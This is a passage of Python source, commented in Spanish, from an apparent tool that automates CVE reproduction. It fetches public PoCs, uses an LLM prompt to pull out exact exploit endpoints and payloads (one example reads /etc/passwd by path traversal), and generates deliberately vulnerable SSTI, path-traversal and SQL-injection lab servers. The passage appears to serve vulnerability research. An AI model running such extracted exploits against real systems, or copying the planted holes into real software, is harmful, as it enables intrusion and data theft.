    task_assign_re = _re.compile(r"\$(\w+)\s*=[^=][^;]*getCmd\(\s*['\"]task['\"]")
    task_literal_inline_re = _re.compile(
        r"getCmd\(\s*['\"]task['\"][^)]*\)\s*(?:===?|==)\s*['\"](\w+)['\"]")

    best_fields: List[str] = []
    best_task = None
    for name, locs in (found or {}).items():
        for loc in locs[:2]:
            file_part, _, _line_part = loc.rpartition(":")
            fpath = _os.path.join(local_path, file_part)
            try:
                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                    text = f.read()
            except OSError:
                continue
            body = _php_function_body(text, name)
            if not body:
                continue
            for m in field_re.finditer(body):
                if m.group(1) not in best_fields and m.group(1) != "task":
                    best_fields.append(m.group(1))
            tm = task_literal_inline_re.search(body)
            if tm:
                best_task = tm.group(1)
            else:
                am = task_assign_re.search(body)
                if am:
                    var = am.group(1)
                    cmp_re = _re.compile(rf"\${_re.escape(var)}\s*(?:===?|==)\s*['\"](\w+)['\"]")
                    cm = cmp_re.search(body)
                    if cm:
                        best_task = cm.group(1)

    if not best_fields and not best_task:
        return None
    out: dict = {}
    endpoint = f"/index.php?option=com_{slug}"
    if best_task:
        endpoint += f"&task={best_task}"
    out["endpoint"] = endpoint
    if best_fields:
        out["parameters"] = best_fields
    return out


def _refine_web_hints_from_source(llm, local_path: str, found: dict, context_lines: int = 50) -> Optional[dict]:
    """Tras el grounding (confirmar que la funcion citada existe de verdad), lee el codigo REAL
    alrededor de cada ubicacion encontrada y le pide al LLM que extraiga el endpoint/parametros
    EXACTOS de ahi -- en vez de quedarse con la primera suposicion que hizo solo a partir de la
    descripcion de la CVE (que a menudo no cita el nombre real del action o de los parametros,
    como se confirmo en vivo con CVE-2025-3605: la hipotesis inicial decia action=flr_blocks_user_
    settings y parameters=[email,password], pero el codigo real registra flrblocksusersettings
    updatehandle y lee flr-blocks-email-update). Devuelve el dict de overrides, o None si no hay
    LLM disponible o no se pudo leer/parsear nada util."""
    if llm is None or not getattr(llm, "available", lambda: False)():
        return None
    import os as _os
    snippets = []
    for name, locs in (found or {}).items():
        for loc in locs[:2]:          # como mucho 2 ubicaciones por funcion, evita contexto gigante
            file_part, _, line_part = loc.rpartition(":")
            try:
                line_no = int(line_part)
            except ValueError:
                continue
            fpath = _os.path.join(local_path, file_part)
            try:
                with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                    lines = f.readlines()
            except OSError:
                continue
            lo = max(0, line_no - 5)
            hi = min(len(lines), line_no + context_lines)
            snippets.append(f"# {file_part} (funcion '{name}' citada en la linea {line_no})\n"
                            + "".join(lines[lo:hi]))
    if not snippets:
        return None
    code = "\n\n".join(snippets)[:6000]     # tope generoso pero acotado para el contexto del LLM
    from ..llm.base import Message
    try:
        raw = llm.chat([Message("system", _REFINE_SYS),
                        Message("user", f"Codigo real:\n```php\n{code}\n```")], json_mode=True)
        data = json.loads(raw)
    except Exception:
        return None
    if not isinstance(data, dict):
        return None
    out = {}
    action = (data.get("ajax_action") or "").strip()
    if action:
        out["endpoint"] = f"/wp-admin/admin-ajax.php?action={action}"
    if data.get("http_method"):
        out["http_method"] = str(data["http_method"]).strip().upper()
    params = data.get("parameters")
    if isinstance(params, list) and params:
        out["parameters"] = [str(p) for p in params if p]
    for key in ("id_param", "email_param", "pass_param"):
        v = (data.get(key) or "").strip()
        if v:
            out[key] = v
    setup_options = data.get("setup_options")
    if isinstance(setup_options, list):
        cleaned = []
        for opt in setup_options:
            if not isinstance(opt, dict):
                continue
            name = str(opt.get("name") or "").strip()
            if not name:
                continue
            value = opt.get("value")
            cleaned.append({"name": name, "value": "1" if value in (None, "") else str(value)})
        if cleaned:
            out["setup_options"] = cleaned
    return out or None


_POC_TEXT_EXT = (".py", ".php", ".js", ".sh", ".md", ".txt", ".rb", ".pl", ".json", ".yml", ".yaml")
_POC_MAX_FILES = 12
_POC_MAX_BYTES_PER_FILE = 20_000
_POC_MAX_TOTAL_BYTES = 60_000


def fetch_public_poc_source(exploit_refs, on_step=None, timeout: float = 60.0) -> Optional[str]:
    """Intenta obtener el texto del PoC publico desde TODAS las fuentes en `exploit_refs`,
    en orden de prioridad: GitHub (clone git) → Exploit-DB (fetch HTML) → otros HTTP.
    Devuelve el contenido del primer PoC que devuelva texto util, o None si todos fallan.
    Best-effort: nunca lanza."""
    step = on_step or (lambda _m: None)
    refs = list(exploit_refs or [])
    if not refs:
        return None

    # -- helpers internos ---------------------------------------------------
    # GitHub sub-page URL patterns that are NOT clonable repos.
    # /issues/, /pull/, /commit/, /releases/ → fetch as HTTP page instead.
    # /blob/ → convert to raw.githubusercontent.com and fetch as HTTP.
    _GH_SUBPAGE_RE = re.compile(
        r"github\.com/[^/]+/[^/]+/(issues|pull|commit|releases|discussions)/",
        re.IGNORECASE,
    )
    _GH_BLOB_RE = re.compile(
        r"github\.com/([^/]+)/([^/]+)/blob/([^/]+)/(.+)",
        re.IGNORECASE,
    )

    def _read_git_ref(ref) -> Optional[str]:
        from .websource import fetch_git_source
        url = ref.url
        # GitHub issue/PR/commit/releases URLs are not repos — route to HTTP fetch.
        if _GH_SUBPAGE_RE.search(url):
            step(f"URL de GitHub no-repo (issue/pull/commit) -- intentando fetch HTTP ({url})...")
            return _read_http_ref(ref)
        # GitHub blob URL → convert to raw.githubusercontent.com
        blob_m = _GH_BLOB_RE.search(url)
        if blob_m:
            raw_url = (f"https://raw.githubusercontent.com/"
                       f"{blob_m.group(1)}/{blob_m.group(2)}/{blob_m.group(3)}/{blob_m.group(4)}")
            import types as _types
            raw_ref = _types.SimpleNamespace(url=raw_url, source="github")
            step(f"GitHub blob URL → raw ({raw_url})...")
            return _read_http_ref(raw_ref)
        step(f"clonando PoC ({url})...")
        fr = fetch_git_source(url, timeout=timeout)
        if not fr.ok or not fr.local_path:
            step(f"  fallo git clone {url}: {getattr(fr, 'error', 'error desconocido')}")
            return None
        chunks, total, count = [], 0, 0
        for dirpath, _dirs, files in os.walk(fr.local_path):
            if "/.git" in dirpath:
                continue
            if count >= _POC_MAX_FILES or total >= _POC_MAX_TOTAL_BYTES:
                break
            for fn in sorted(files):
                if count >= _POC_MAX_FILES or total >= _POC_MAX_TOTAL_BYTES:
                    break
                if not fn.lower().endswith(_POC_TEXT_EXT):
                    continue
                fp = os.path.join(dirpath, fn)
                try:
                    with open(fp, "r", encoding="utf-8", errors="replace") as fh:
                        text = fh.read(_POC_MAX_BYTES_PER_FILE)
                except OSError:
                    continue
                if not text.strip():
                    continue
                rel = os.path.relpath(fp, fr.local_path)
                chunks.append(f"# {rel}\n{text}")
                total += len(text)
                count += 1
        if chunks:
            step(f"PoC publico leido: {count} fichero(s) de {ref.url}")
            return "\n\n".join(chunks)
        step(f"  repo vacio/sin ficheros de texto: {ref.url}")
        return None

    def _read_http_ref(ref) -> Optional[str]:
        """Descarga una pagina web del PoC (Exploit-DB, PacketStorm, otro) y extrae texto."""
        import urllib.request as _ur
        import json as _json
        url = ref.url
        # GitHub issue/PR URLs: use the REST API to get the body as Markdown (no HTML).
        _gh_issue_m = re.search(
            r"github\.com/([^/]+)/([^/]+)/(issues|pull)/(\d+)", url, re.IGNORECASE
        )
        if _gh_issue_m:
            owner, repo_name = _gh_issue_m.group(1), _gh_issue_m.group(2)
            kind = "pulls" if _gh_issue_m.group(3).lower() == "pull" else "issues"
            num = _gh_issue_m.group(4)
            api_url = f"https://api.github.com/repos/{owner}/{repo_name}/{kind}/{num}"
            step(f"GitHub {kind[:-1]} API ({api_url})...")
            try:
                req = _ur.Request(
                    api_url,
                    headers={"User-Agent": "binoracle/1.0", "Accept": "application/vnd.github+json"},
                )
                with _ur.urlopen(req, timeout=min(timeout, 20)) as resp:
                    data = _json.loads(resp.read(200_000))
                body = (data.get("body") or "").strip()
                if len(body) > 30:
                    step(f"PoC extraido de GitHub {kind[:-1]} body: {url}")
                    return f"# PoC de {url}\n{body[:_POC_MAX_BYTES_PER_FILE]}"
            except Exception as e:
                step(f"  fallo GitHub API {api_url}: {e}")
            # fall through to HTML scrape

        step(f"descargando PoC HTTP ({url})...")
        try:
            req = _ur.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with _ur.urlopen(req, timeout=min(timeout, 30)) as resp:
                raw = resp.read(200_000)
        except Exception as e:
            step(f"  fallo descarga {url}: {e}")
            return None
        # Intentar decodificar
        try:
            text = raw.decode("utf-8", errors="replace")
        except Exception:
            return None
        # Exploit-DB: extraer el bloque de codigo entre <pre id="codeBlock"> o similar
        import re as _re
        for pat in (
            r'<pre[^>]*id=["\']?codeBlock["\']?[^>]*>(.*?)</pre>',
            r'<div[^>]*class=["\'][^"\']*code[^"\']*["\'][^>]*><pre[^>]*>(.*?)</pre>',
            r'<pre[^>]*class=["\'][^"\']*highlight[^"\']*["\'][^>]*>(.*?)</pre>',
        ):
            m = _re.search(pat, text, _re.DOTALL | _re.IGNORECASE)
            if m:
                import html as _html
                code = _html.unescape(_re.sub(r'<[^>]+>', '', m.group(1))).strip()
                if len(code) > 50:
                    step(f"PoC extraido de pagina HTML: {url}")
                    return f"# PoC de {url}\n{code}"
        # Fallback: si la respuesta es texto plano (script Python/bash/etc.)
        if text.strip().startswith(("#!", "#!/", "import ", "#!/usr/bin", "curl ", "python")):
            step(f"PoC texto plano: {url}")
            return f"# PoC de {url}\n{text[:_POC_MAX_BYTES_PER_FILE]}"
        step(f"  no se pudo extraer codigo util de {url}")
        return None

    # -- iterar todas las fuentes en orden de fiabilidad -------------------
    # 1) GitHub primero (clone completo, contenido mas rico)
    github_tried = 0
    for ref in refs:
        if getattr(ref, "source", "") != "github":
            continue
        result = _read_git_ref(ref)
        github_tried += 1
        if result:
            return result
        if github_tried >= 3:   # max 3 repos GitHub para no tardar demasiado
            break

    # 2) Exploit-DB y PacketStorm (fetch HTTP)
    for ref in refs:
        src = getattr(ref, "source", "")
        if src not in ("exploit-db", "packetstorm"):
            continue
        result = _read_http_ref(ref)
        if result:
            return result

    # 3) Resto de URLs HTTP no clasificadas
    for ref in refs:
        src = getattr(ref, "source", "")
        if src in ("github", "exploit-db", "packetstorm"):
            continue
        url = getattr(ref, "url", "")
        if url.startswith("http"):
            result = _read_http_ref(ref)
            if result:
                return result

    step("ninguna fuente publica de PoC devolvio contenido util -- el LLM razonara desde el CVE")
    return None


_RAW_HTTP_REQUEST_RE = re.compile(
    r"^([A-Za-z]{3,10})[ \t]+(\S+)[ \t]+HTTP/[12](?:\.[01])?[ \t]*\r?\n"
    r"((?:[^\r\n]+\r?\n)*)"
    r"\r?\n"
    r"(.*)",
    re.MULTILINE | re.DOTALL)
_RAW_HTTP_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"}


def parse_raw_http_poc_request(text: str) -> Optional[dict]:
    """Busca un bloque de peticion HTTP/1.x CRUDA dentro del texto de un PoC (el formato que la
    mayoria de los write-ups/README de GitHub usan: 'METODO /ruta HTTP/1.1', cabeceras, linea en
    blanco, cuerpo) y lo parsea DETERMINISTICAMENTE -- sin LLM de por medio, cero riesgo de que
    alucine un valor. Devuelve {"method", "path", "headers", "body_params"} (body_params es un
    dict name->VALOR REAL si el cuerpo es application/x-www-form-urlencoded, None si no se pudo
    interpretar como tal) o None si no se encontro ningun bloque reconocible.

    Confirmado en vivo (CVE-2024-50508): el PoC real traia justo este bloque -- 'action='
    'pc_added_uploaded_image&file[path]=/etc/passwd' -- con los valores REALES de TODOS los
    parametros, 'action' incluido (el critico para que WordPress enrute la peticion a algun
    manejador). La extraccion vía LLM (_extract_hints_from_real_poc) reduce 'parameters' a una
    lista de NOMBRES sin valores, perdiendo justo el dato que hace que la peticion real funcione
    -- cuando el PoC trae un bloque como este, gana sobre esa extraccion y sobre la hipotesis del
    LLM: es, literalmente, la peticion que su autor confirmo que dispara la vulnerabilidad."""
    if not text:
        return None
    m = _RAW_HTTP_REQUEST_RE.search(text)
    if not m:
        return None
    method, path, header_block, rest = m.groups()
    method = method.upper()
    if method not in _RAW_HTTP_METHODS:
        return None
    headers = {}
    for line in header_block.splitlines():
        if ":" in line:
            k, _, v = line.partition(":")
            headers[k.strip()] = v.strip()
    # el cuerpo es solo la PRIMERA linea no vacia tras la cabecera en blanco -- lo que venga
    # despues en un README (la respuesta del servidor, el siguiente bloque de texto...) no es
    # parte del cuerpo de ESTA peticion.
    body_line = ""
    for line in rest.splitlines():
        if line.strip():
            body_line = line.strip()
            break
    content_type = (headers.get("Content-Type") or headers.get("content-type") or "").lower()
    body_params = None
    if body_line and ("application/x-www-form-urlencoded" in content_type or
                      (not content_type and "=" in body_line and not body_line.startswith("{"))):
        from urllib.parse import parse_qsl
        pairs = parse_qsl(body_line, keep_blank_values=True)
        if pairs:
            body_params = dict(pairs)
    return {"method": method, "path": path, "headers": headers, "body_params": body_params,
           "raw_body": body_line}


_EXTRACT_POC_SYS = (
    "Eres un investigador de explotacion para objetivos AUTORIZADOS (pentest/CTF/research). Te doy "
    "el contenido de un repositorio PUBLICO de GitHub que es el PoC REAL ya publicado para una CVE "
    "(codigo/scripts/README) -- no una descripcion de terceros, es el exploit real tal cual lo "
    "publico su autor. Tu trabajo es leerlo y extraer los datos EXACTOS que usa para explotar la "
    "vulnerabilidad, en vez de adivinar desde el resumen de la CVE. Responde SOLO con JSON valido "
    "con las claves: source_url (si el PoC dice que plugin/paquete exacto y version usa -- para "
    "WordPress deja el slug si lo ves), affected_version (copia los numeros de version TAL CUAL "
    "aparecen en el texto, con todos sus puntos -- '2.1.3' nunca '213', '2.8.2' nunca '282'; si el "
    "PoC da un rango copia el limite SUPERIOR con sus puntos), http_method (GET o POST), endpoint "
    "(ruta exacta que el PoC golpea; si es wp-admin/admin-ajax.php, el endpoint DEBE incluir el "
    "valor REAL de 'action' tal cual aparece en el PoC como query string, p.ej. "
    "/wp-admin/admin-ajax.php?action=pc_added_uploaded_image -- NUNCA dejes 'action' como un "
    "nombre de parametro suelto en 'parameters' sin su valor real: sin el, WordPress no enruta la "
    "peticion a ningun manejador y el ataque nunca se ejecuta, por correcto que sea el resto del "
    "payload), parameters (lista de nombres EXACTOS de parametro que el PoC manda, DISTINTOS de "
    "'action', que ya va en el endpoint), payload_example (el valor de payload EXACTO que el PoC usa para el parametro "
    "vulnerable, tal cual aparece en su codigo -- no lo resumas ni lo traduzcas), setup_options "
    "(lista de objetos {\"name\":..., \"value\":...} -- SOLO si el PoC/README dice explicitamente "
    "que hay que activar algun ajuste/opcion del plugin ANTES de que el ataque funcione, p.ej. "
    "'first enable X in plugin settings'; vacio si no menciona nada de eso), notes (una frase con "
    "cualquier precondicion o detalle importante que el PoC mencione y no quepa en los campos "
    "anteriores). Deja vacio lo que el PoC no diga explicitamente -- nunca inventes."
)


def _drop_unreliable_poc_version(poc_hints: dict, existing_version: str) -> tuple:
    """Confirmado en vivo (CVE-2024-1071): el LLM, leyendo el PoC, transcribio el rango de
    versiones SIN los puntos ("213-282" en vez de "2.1.3-2.8.2") -- eso piso la version YA bien
    formada que veniamos de la hipotesis desde la descripcion de la CVE (paso 2 de
    investigate_cve), y acabo generando una URL de descarga rota. No se deja que un
    affected_version SIN NINGUN PUNTO pise uno que SI lo tenia -- casi ninguna version real de un
    plugin de WordPress carece de puntos, asi que es senal de transcripcion mala del LLM, no de un
    dato mejor que el que ya teniamos. Devuelve (poc_hints posiblemente sin 'affected_version',
    (version_descartada, version_mantenida) o None si no se descarto nada)."""
    poc_version = (poc_hints.get("affected_version") or "").strip()
    existing_version = (existing_version or "").strip()
    if poc_version and "." not in poc_version and "." in existing_version:
        cleaned = {k: v for k, v in poc_hints.items() if k != "affected_version"}
        return cleaned, (poc_version, existing_version)
    return poc_hints, None


def _drop_poc_self_referencing_source_url(poc_hints: dict, poc_repo_url: str) -> tuple:
    """Confirmado en vivo (CVE-2024-1071): el LLM, leyendo el PoC, devolvio como source_url el
    propio repositorio de GitHub del PoC que se le acababa de dar a leer (en vez del slug del
    plugin de WordPress.org, como se le pedia explicitamente) -- fetch_source() intento entonces
    clonar ESE repo (el del exploit, no el del plugin) y, encima, con --branch puesta a la
    version afectada (que logicamente no existe como rama ahi), rompiendo la obtencion del codigo
    real que ya habia funcionado un paso antes con la hipotesis previa. El repo del PoC NUNCA es
    el codigo fuente del plugin -- si source_url coincide con el (con o sin barra/.git final), se
    descarta en vez de dejar que pise un source_url mejor que ya tuvieramos. Devuelve (poc_hints
    posiblemente sin 'source_url', la url descartada o None si no se descarto nada)."""
    def _norm(u: str) -> str:
        return (u or "").strip().rstrip("/").removesuffix(".git").lower()
    poc_source = (poc_hints.get("source_url") or "").strip()
    if poc_source and poc_repo_url and _norm(poc_source) == _norm(poc_repo_url):
        cleaned = {k: v for k, v in poc_hints.items() if k != "source_url"}
        return cleaned, poc_source
    return poc_hints, None


def _extract_hints_from_real_poc(llm, poc_text: str) -> Optional[dict]:
    """Analogo a _refine_web_hints_from_source, pero a partir del PoC REAL ya publicado (traido por
    fetch_public_poc_source), no del codigo del plugin ni de la descripcion de la CVE -- el autor
    del PoC ya resolvio como dispararla de verdad, asi que sus datos (endpoint, parametros, el
    payload EXACTO, y cualquier precondicion que documente) pesan mas que una hipotesis generada
    solo desde el resumen de la CVE. Devuelve el dict de overrides, o None si no hay LLM disponible
    o no se pudo extraer nada util."""
    if llm is None or not getattr(llm, "available", lambda: False)():
        return None
    if not (poc_text or "").strip():
        return None
    from ..llm.base import Message
    try:
        raw = llm.chat([Message("system", _EXTRACT_POC_SYS),
                        Message("user", f"Contenido del PoC publico:\n```\n{poc_text[:8000]}\n```")],
                       json_mode=True)
        data = json.loads(raw)
    except Exception:
        return None
    if not isinstance(data, dict):
        return None
    out = {}
    for key in ("source_url", "affected_version", "http_method", "endpoint"):
        v = str(data.get(key) or "").strip()
        if v:
            out[key] = v.upper() if key == "http_method" else v
    params = data.get("parameters")
    if isinstance(params, list) and params:
        out["parameters"] = [str(p) for p in params if p]
    payload_example = data.get("payload_example")
    if isinstance(payload_example, str) and payload_example.strip():
        out["payload_example"] = payload_example.strip()
    notes_txt = data.get("notes")
    if isinstance(notes_txt, str) and notes_txt.strip():
        out["poc_notes"] = notes_txt.strip()
    setup_options = data.get("setup_options")
    if isinstance(setup_options, list):
        cleaned = []
        for opt in setup_options:
            if not isinstance(opt, dict):
                continue
            name = str(opt.get("name") or "").strip()
            if not name:
                continue
            value = opt.get("value")
            cleaned.append({"name": name, "value": "1" if value in (None, "") else str(value)})
        if cleaned:
            out["setup_options"] = cleaned
    return out or None


_PLUGIN_NAME_PATTERNS = [
    # Patron Patchstack/NVD casi universal para CVEs de plugins de WordPress (confirmado en
    # vivo: CVE-2024-27956 "...vulnerability in ValvePress Automatic allows SQL Injection.This
    # issue affects Automatic: from n/a through 3.92.0." -- el nombre REAL del plugin es el que
    # va despues de "This issue affects", no el "Vendor Producto" completo de antes de "allows"
    # (ahi se cuela el vendor, que NO es parte del slug de WordPress.org)).
    re.compile(r"[Tt]his issue affects ([A-Za-z0-9][A-Za-z0-9 .\-]{1,60}?):"),
    re.compile(r"vulnerability in ([A-Za-z0-9][A-Za-z0-9 .\-]{1,60}?) allows"),
    re.compile(r"in the ([A-Za-z0-9][A-Za-z0-9 .\-]{1,60}?) WordPress plugin"),
    re.compile(r"in the ([A-Za-z0-9][A-Za-z0-9 .\-]{1,60}?) plugin"),
    # otro fraseo muy comun de WPScan/Patchstack (confirmado en vivo: CVE-2024-3552 "The Web
    # Directory Free WordPress plugin before 1.7.0 does not sanitise...") -- "The <X> WordPress
    # plugin before/version <Y> ..." en vez de "vulnerability in X allows"/"This issue affects X:".
    re.compile(r"[Tt]he ([A-Za-z0-9][A-Za-z0-9 .\-]{1,60}?) WordPress plugin (?:before|versions?)"),
    # WooCommerce/WooPayments style: "vulnerability exists in X, also known as Y" -- priorizamos
    # el alias (despues de "also known as") porque es el nombre largo que genera el slug correcto.
    # Confirmado en vivo: CVE-2023-28121 "in WooPayments, also known as WooCommerce Payments" →
    # WooPayments→woo-payments no existe en WordPress.org pero WooCommerce Payments→woocommerce-payments sí.
    re.compile(r"also known as ([A-Za-z0-9][A-Za-z0-9 .\-]{1,60})"),
    # "vulnerability exists in X versions" -- fraseo alternativo de NVD
    re.compile(r"(?:vulnerability|vuln(?:erability)?)\s+exists in ([A-Za-z0-9][A-Za-z0-9 .\-]{1,60}?)[,\s]"),
    # "X plugin for WordPress" (en vez de "X WordPress plugin")
    re.compile(r"([A-Za-z0-9][A-Za-z0-9 .\-]{1,60}?) plugin for (?:WordPress|WooCommerce)"),
    # "plugin X" – fraseo corto de NVD cuando el nombre es el sujeto directo
    re.compile(r"plugin\s+([A-Za-z0-9][A-Za-z0-9 .\-]{1,60}?)\s+(?:<=|before|through|version)"),
]


# Slugs that are NVD phrasing artifacts, not real product names.
# "an-issue-in-X" comes from "This issue affects an-issue-in-X:" in some NVD records.
_SLUG_REJECT_PREFIXES = ("an-issue-in-", "this-issue-", "the-issue-", "an-auth-",
                          "a-vuln-", "the-vuln-", "affected-")


def _guess_wp_slug_from_description(description: str) -> Optional[str]:
    """Fallback DETERMINISTA para cuando el LLM no propuso source_url (confirmado en vivo que
    pasa: el texto libre del LLM no siempre extrae/adivina el slug de WordPress.org aunque el
    nombre del plugin este literal en la descripcion del CVE) -- el formato de descripcion que
    NVD/Patchstack generan para plugins de WordPress es casi siempre "vulnerability in <nombre>
    allows ...This issue affects <nombre>: from X through Y", asi que se puede extraer el nombre
    del plugin con una regex sin depender del LLM en absoluto. Devuelve el slug candidato
    (minusculas, espacios->guiones) o None si la descripcion no trae ese patron -- es solo una
    PRIMERA HIPOTESIS a probar contra WordPress.org, no una garantia (fetch_source() ya falla
    con honestidad si el slug no existe de verdad)."""
    if not description:
        return None
    candidates: list = []
    for pattern in _PLUGIN_NAME_PATTERNS:
        m = pattern.search(description)
        if m:
            name = m.group(1).strip().rstrip(".")
            slug = re.sub(r"[^a-z0-9]+", "-", name.lower()).strip("-")
            if slug and len(slug) >= 3:
                # Recover real slug from NVD phrasing artifacts:
                # "an-issue-in-woocommerce-payments" → "woocommerce-payments"
                for pfx in _SLUG_REJECT_PREFIXES:
                    if slug.startswith(pfx):
                        slug = slug[len(pfx):]
                        break
                if slug and len(slug) >= 3:
                    return slug
    return None


# ---------------------------------------------------------------------------
# Scaffold automático de laboratorios para CVEs de paquetes Python/Node
# ---------------------------------------------------------------------------
# Confirmado en vivo: Qwen a veces NO incluye source_url para CVEs de frameworks
# de Python/Node (aiohttp, flask-reuploaded, Jinja2, Django, Next.js...) -- en
# vez de rendirse, se genera un directorio minimal con requirements.txt/package.json
# + un servidor de ejemplo que activa el camino vulnerable, para que genericverify
# lo levante en Docker y confirme la hipotesis igual que si el LLM hubiera dado la URL.

_PIP_PKG_RE = re.compile(
    r"(?i)\b(aiohttp|flask[_-]reuploaded|jinja2|jinja|django|bottle|tornado|"
    r"fastapi|starlette|werkzeug|pillow|paramiko|twisted|pyramid|uvicorn|"
    r"gunicorn|httpx|sanic|falcon|ftp[_-]flask[_-]python|ftp.flask)\b"
)
_NPM_PKG_RE = re.compile(
    r"(?i)\b(next\.?js|next|express|koa|hapi|fastify|nuxt|gatsby|"
    r"serve-static|connect|restify|feathers|glob)\b"
)
# Gemas Ruby conocidas que aparecen en CVEs web -- se chequean ANTES que pip porque
# nombres como "rack" coinciden también con el regex genérico de paquetes pip.
_RUBY_GEM_RE = re.compile(
    r"(?i)\b(rack|rails|sinatra|hanami|padrino|grape|omniauth|devise|"
    r"nokogiri|puma|actionpack|activesupport|actionview|sprockets|capybara)\b"
)
# Artefactos Maven / Java conocidos en CVEs web -- Spring, Log4j, Struts, Netty, etc.
_MAVEN_PKG_RE = re.compile(
    r"(?i)\b(spring[_-]?(core|web|webmvc|boot|security|cloud|framework)|"
    r"log4j[_-]?(core|api|2)?|log4j2?|struts2?|"
    r"jackson[_-]?(databind|core|annotations)|"
    r"apache[_-]?commons[_-]?(text|collections|io|codec|lang)|"
    r"netty[_-]?(all|codec|http|handler)?|netty|"
    r"h2[_-]?database|h2db|"
    r"xstream|snakeyaml|fastjson|"
    r"jersey[_-]?(client|server|core)?|"
    r"undertow|wildfly|"
    r"shiro[_-]?(core|web)?|apache[_-]?shiro)\b"
)
# Paquetes PHP standalone conocidos en CVEs
_PHP_PKG_RE = re.compile(
    r"(?i)\b(phpmailer|phpmyadmin|monolog|"
    r"symfony[_-]?(http[_-]?foundation|security|core|routing|serializer)?|symfony|"
    r"laravel[_-]?(framework|core)?|laravel|"
    r"guzzlehttp|guzzle|slim[_-]?framework|slim|"
    r"laminas[_-]?(http|db|mvc)?|laminas|"
    r"swiftmailer|twig)\b"
)
# Paquetes Go conocidos en CVEs web
_GO_PKG_RE = re.compile(
    r"(?i)\b(gin[_-]?gonic|gin|echo[_-]?labstack|"
    r"gorilla[_-]?(mux|websocket|sessions)|gorilla|"
    r"go[_-]?chi|go[_-]?swagger|chi|"
    r"grpc[_-]?go|beego|revel|buffalo|fiber)\b"
)

_STATIC_DIR_FOR_TRAVERSAL = "static"


def _gen_pip_app(pkg: str, vuln_class: str, endpoint: str, param: str, pkg_version: str) -> str:
    """Genera un servidor Python minimal que expone el camino vulnerable del paquete."""
    pkg_lower = pkg.lower()
    if vuln_class == "path-traversal":
        if "aiohttp" in pkg_lower:
            return (
                "from aiohttp import web\n"
                "import os\n\n"
                "STATIC_ROOT = os.path.join(os.path.dirname(__file__), 'static')\n"
                "os.makedirs(STATIC_ROOT, exist_ok=True)\n"
                "open(os.path.join(STATIC_ROOT, 'index.html'), 'w').write('<html>OK</html>')\n\n"
                "app = web.Application()\n"
                "app.router.add_static('/static', STATIC_ROOT, show_index=True, follow_symlinks=True)\n\n"
                "if __name__ == '__main__':\n"
                "    web.run_app(app, host='0.0.0.0', port=5000)\n"
            )
        return (
            "from flask import Flask, send_from_directory\n"
            "import os\n\n"
            "app = Flask(__name__)\n"
            "STATIC_ROOT = os.path.join(os.path.dirname(__file__), 'static')\n"
            "os.makedirs(STATIC_ROOT, exist_ok=True)\n\n"
            "@app.route('/static/<path:filename>')\n"
            "def serve_static(filename):\n"
            "    return send_from_directory(STATIC_ROOT, filename)\n\n"
            "if __name__ == '__main__':\n"
            "    app.run(host='0.0.0.0', port=5000)\n"
        )
    if vuln_class == "ssti":
        if "flask" in pkg_lower or "reuploaded" in pkg_lower:
            # Flask-Reuploaded SSTI: en versiones <1.4.0, cuando el app renderiza el nombre
            # del fichero subido a traves de render_template_string, el motor Jinja2 lo evalua
            # sin escapar. Replicamos el patron vulnerable con Flask puro para que genericverify
            # pueda sondear el parametro 'name' directamente (sin necesitar flask-reuploaded
            # instalado, que causa ImportError por incompatibilidades con Flask>=3).
            return (
                "from flask import Flask, request, render_template_string\n\n"
                "app = Flask(__name__)\n\n"
                "@app.route('/upload', methods=['GET', 'POST'])\n"
                "def upload():\n"
                "    # El nombre del fichero llega como param ?name= o como campo de formulario\n"
                "    name = (request.args.get('name') or request.form.get('name', '')\n"
                "            or (request.files['file'].filename\n"
                "                if 'file' in request.files else ''))\n"
                "    if name:\n"
                "        # Vulnerable: render_template_string con nombre sin escapar\n"
                "        return render_template_string('<p>Saved: ' + name + '</p>')\n"
                "    return ('<form method=post enctype=multipart/form-data>'\n"
                "            '<input name=file type=file>'\n"
                "            '<input name=name placeholder=filename>'\n"
                "            '<input type=submit></form>')\n\n"
                "if __name__ == '__main__':\n"
                "    app.run(host='0.0.0.0', port=5000)\n"
            )
        if "jinja" in pkg_lower:
            return (
                "from flask import Flask, request, render_template_string\n"
                "import jinja2\n\n"
                "app = Flask(__name__)\n\n"
                "@app.route('/render', methods=['GET', 'POST'])\n"
                "def render():\n"
                "    tmpl = request.args.get('template') or request.form.get('template', 'hello')\n"
                "    env = jinja2.Environment(undefined=jinja2.DebugUndefined)\n"
                "    return env.from_string(tmpl).render()\n\n"
                "if __name__ == '__main__':\n"
                "    app.run(host='0.0.0.0', port=5000)\n"
            )
    if vuln_class in ("sqli", "sql-injection"):
        p = param or "id"
        if "django" in pkg_lower:
            return (
                "import os, time\n"
                "os.environ['DJANGO_SETTINGS_MODULE'] = 'settings'\n"
                "import django\n"
                "from django.conf import settings\n"
                "if not settings.configured:\n"
                "    settings.configure(\n"
                "        DATABASES={'default': {\n"
                "            'ENGINE': 'django.db.backends.postgresql',\n"
                "            'NAME': 'lab', 'USER': 'lab', 'PASSWORD': 'lab',\n"
                "            'HOST': os.environ.get('DB_HOST', 'db'), 'PORT': '5432'}},\n"
                "        INSTALLED_APPS=['django.contrib.contenttypes', 'django.contrib.auth'],\n"
                # ROOT_URLCONF must point to a module Django can actually import. There is
                # no separate urls.py here (urlpatterns are defined below, in this same
                # file) -- pointing at a literal 'urls' module name that was never written
                # causes `ModuleNotFoundError: No module named 'urls'` at request time
                # (confirmed live: CVE-2025-59681 lab). __name__ evaluates to '__main__'
                # when this script runs as `python app.py` (the Dockerfile CMD), and
                # importlib.import_module('__main__') just returns the already-loaded
                # module from sys.modules -- no re-execution, no extra file needed.
                "        ROOT_URLCONF=__name__, SECRET_KEY='binoracle', DEBUG=True,\n"
                "        ALLOWED_HOSTS=['*'])\n"
                "    django.setup()\n"
                "    # Crear tablas (auth_user) antes de que llegue cualquier peticion\n"
                "    from django.core.management import call_command\n"
                "    call_command('migrate', '--run-syncdb', verbosity=0, interactive=False)\n"
                "    # Insertar un usuario de prueba para que las consultas devuelvan datos\n"
                "    from django.db import connection as _conn\n"
                "    with _conn.cursor() as _c:\n"
                "        try:\n"
                "            _c.execute(\"INSERT OR IGNORE INTO auth_user \"\n"
                "                       \"(id,password,last_login,is_superuser,username,first_name,\"\n"
                "                       \"last_name,email,is_staff,is_active,date_joined) \"\n"
